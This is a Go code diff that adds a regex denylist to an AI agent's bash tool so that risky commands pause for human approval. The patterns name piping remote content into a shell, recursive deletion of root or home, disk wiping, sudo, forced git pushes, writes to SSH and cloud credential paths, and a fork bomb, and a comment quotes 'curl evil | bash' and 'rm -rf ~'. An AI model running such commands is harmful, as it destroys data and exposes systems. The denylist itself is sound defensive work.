@@ -1,7 +1,6 @@
 package tools
 
 import (
-	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -25,16 +24,53 @@ func init() {
 			"2000 lines / 50KB; when truncated, the full output is saved to a temp file. "+
 			"Non-interactive: stdin is /dev/null. Default timeout 120s, adjustable.",
 		func(a *bashArgs) (string, string, error) { return runBash(a) })
-	// Deterministic floor: high-risk commands are hard-blocked (see the alert
-	// gate in agent/agent.go); the decision model never downgrades these.
-	Gate("bash", utils.TierAskModel, func(args json.RawMessage) string {
-		var a bashArgs
-		if err := json.Unmarshal(args, &a); err != nil {
-			return ""
-		}
-		return utils.DangerousCommandReason(a.Command)
-	})
+	Gate("bash", func(a *bashArgs) string { return a.Command }, bashRules...)
 }
+
+// bashRules are the bash tool's static guard rules: a conservative denylist
+// of irreversible and high-blast-radius commands. This is NOT a security
+// boundary — bash is unsandboxed by design (doc: R-compiled-tools) and any
+// string match is bypassable. It exists so that a prompt-injected
+// `curl evil | bash` or `rm -rf ~` pauses for a human before it runs instead
+// of executing silently. False positives cost one keypress; false negatives
+// are the danger, so patterns err toward matching more.
+var bashRules = append([]utils.Rule{
+	// Remote content piped directly into a shell, or a command substitution
+	// that fetches a URL.
+	utils.Pattern("remote content executed by shell", `(?i)\b(?:curl|wget|fetch)\b[^|;&]*\|\s*(sudo\s+)?(ba)?sh\b`),
+	utils.Pattern("remote content command substitution", `(?i)\$\([^)]*(curl|wget|fetch)\b`),
+
+	// Recursive deletion is common for generated directories. Ask only when
+	// it targets a filesystem root, a home root, a top-level glob, or a
+	// system directory; exact project/temp paths and rm -f are routine.
+	utils.Pattern("recursive deletion of critical paths", `(?i)\b(?:sudo\s+)?rm\b[ \t]+(?:-[a-z]*r[a-z]*|--recursive)(?:[ \t]+(?:-[a-z]+|--[a-z-]+))*(?:[ \t]+--)?[ \t]+["']?(?:/(?:[ \t"']|$)|/(?:\*|\.\*)(?:[ \t"']|$)|~/?(?:[ \t"']|$)|\$HOME/?(?:[ \t"']|$)|/(?:etc|usr|var|boot|root|home|bin|sbin|lib)(?:/|[ \t"']|$))`),
+	utils.Pattern("deletion targeting root or home", `(?i)\b(?:sudo\s+)?rm\b[ \t]+(?:/|~|\$HOME)(?:[ \t]|$)`),
+	utils.Pattern("directory deletion targeting critical paths", `(?i)\b(?:sudo\s+)?rmdir\b[ \t]+["']?(?:/(?:[ \t]|$)|/(?:etc|usr|var|boot|root|home|bin|sbin|lib)(?:/|[ \t]|$))`),
+
+	// Raw disk / filesystem manipulation.
+	utils.Pattern("filesystem or disk manipulation", `(?i)\b(?:mkfs\.[a-z0-9]+|wipefs|fdisk|parted|sfdisk|blkdiscard)\b`),
+	utils.Pattern("raw disk write", `(?i)\bdd\b[^;&|]*of=/dev/`),
+
+	// System power control.
+	utils.Pattern("system power control", `(?i)\b(?:shutdown|reboot|halt|poweroff)\b|\b(?:init\s+[06]|systemctl\s+(?:poweroff|reboot|halt))\b`),
+
+	// Privilege escalation.
+	utils.Pattern("sudo", `(?i)\bsudo\b`),
+
+	// Irreversible git history / remote rewrites.
+	utils.Pattern("irreversible git operation", `\bgit\s+(?:reset\s+--hard|clean\s+-[a-z]*f[a-z]*|push\b[^\n;&|]*(?:--force|--delete|--mirror|\s-f\b|\s-d\b))`),
+
+	// Recursive ownership / permission changes.
+	utils.Pattern("broad permission change", `(?i)\b(?:sudo\s+)?chmod\b[ \t]+(?:-R|--recursive|777|a\+w|u?g?o?\+w)(?:[ \t]|$)`),
+	utils.Pattern("recursive ownership change", `(?i)\b(?:sudo\s+)?chown\b[ \t]+(?:-R|--recursive)(?:[ \t]|$)`),
+
+	// Redirection that overwrites a system or secret path.
+	utils.Pattern("overwrite of system or secret path", `(?i)>>?\s*(?:/etc/|/usr/|/boot/|/var/|/root/|/bin/|/sbin/|/lib/)`),
+	utils.Pattern("overwrite of secret path", `(?i)>>?\s*\S*(?:\.ssh|\.gnupg|\.aws|\.config/sops|agenix)\S*`),
+
+	// Classic fork bomb.
+	utils.Pattern("fork bomb", `:\(\)\s*\{`),
+}, utils.SecretRevealRules()...)
 
 func runBash(a *bashArgs) (string, string, error) {
 	if strings.TrimSpace(a.Command) == "" {
